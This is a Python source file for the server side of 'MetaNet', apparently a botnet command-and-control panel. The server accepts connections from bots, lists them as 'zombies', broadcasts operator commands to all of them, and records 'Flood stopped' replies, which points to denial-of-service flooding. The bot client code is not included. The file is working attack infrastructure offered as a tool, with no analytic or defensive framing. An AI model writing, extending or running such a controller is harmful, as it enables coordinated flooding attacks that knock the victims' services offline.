# Server
import os
import socket
import random
import threading
import colorama
from pystyle import Colors, Colorate, Center, Write, Box

# Server configuration
HOST = '127.0.0.1'
PORT = 5555

colorama.init(autoreset=True)

# Create a socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to a specific address and port
server_socket.bind((HOST, PORT))

# Listen for incoming connections
server_socket.listen()

# List to store connected clients
clients = []
message_queue = []
output_messages = []
connected_clients_count = 0
clients_count_lock = threading.Lock()
color_list = [colorama.Fore.RED, colorama.Fore.GREEN, colorama.Fore.YELLOW, colorama.Fore.BLUE, colorama.Fore.MAGENTA, colorama.Fore.CYAN, colorama.Fore.LIGHTMAGENTA_EX]

os.system("title MetaNet")

def banner():
    global connected_clients_count
    x = '''
                 ╔╦╗┌─┐┌┬┐┌─┐╔╗╔┌─┐┌┬┐
                 ║║║├┤  │ ├─┤║║║├┤  │ 
                 ╩ ╩└─┘ ┴ ┴ ┴╝╚╝└─┘ ┴ 
       ╚══════╦════════════════════════╦══════╝
╔═════════════╩════════════════════════╩══════════════╗
║                                                     ║
║                ~ Welcome to MetaNet                 ║
║               ~ Developed by @7p4n1c                ║
║                                                     ║
╚═════════════════════════════════════════════════════╝
    '''
    print(Colorate.Vertical(Colors.red_to_blue, Center.XCenter(x), 1))

banner()

def handle_client(client_socket, addr):
    global connected_clients_count
    with clients_count_lock:
        connected_clients_count += 1
        os.system("title MetaNet {}".format(connected_clients_count))
    try:
        while True:
            # Receive data from the client
            data = client_socket.recv(1024).decode('utf-8')
            if not data:
                break  # Client disconnected

            if data == "Flood stopped":
                message_queue.append(f"Flood stopped by {addr[0]}:{addr[1]}")
            else:
                # Handle other messages from clients as needed
                pass
    except Exception as e:
        pass
    finally:
        with clients_count_lock:
            connected_clients_count -= 1
            os.system("title MetaNet {}".format(connected_clients_count))
            clients.remove(client_socket)
            client_socket.close()



def broadcast(message):
    # Send the message to all connected clients
    for client in clients:
        try:
            client.send(message.encode('utf-8'))
        except Exception as e:
            clients.remove(client)

# Function to continuously get user input and broadcast to clients
def send_messages():
    while True:
        message = Write.Input(text=Center.XCenter("User@MetaNet> ",spaces=32),color=Colors.red_to_blue,interval=0000.000015)
        print("")
        if message.lower() in ['list', 'ls']:
            client_info = [f'[{i+1}] {addr[0]}:{addr[1]}' for i, addr in enumerate(map(lambda x: x.getpeername()[0:2], clients))]
            if client_info:
                print(Center.XCenter("""
                   Client(s) Connected
─══════════════════════════☆☆══════════════════════════─
                                 
"""))
                for zombie in client_info:
                    chosen_color = random.choice(color_list)
                    print(Center.XCenter(f"{chosen_color}{zombie}"))
            else:
                print("no clients")
        else:
            broadcast(message)

# Function to continuously process messages from clients
def process_messages():
    while True:
        if message_queue:
            message = message_queue.pop(0)
            if not message.startswith("Flood stopped by"):
                output_messages.append(message)

# Start a thread to handle user input and broadcasting
input_thread = threading.Thread(target=send_messages)
input_thread.start()

# Start a thread to handle messages from clients
message_thread = threading.Thread(target=process_messages)
message_thread.start()

# Accept and handle incoming connections
while True:
    client_socket, addr = server_socket.accept()
    clients.append(client_socket)

    # Create a thread to handle the client
    client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
    client_thread.start()
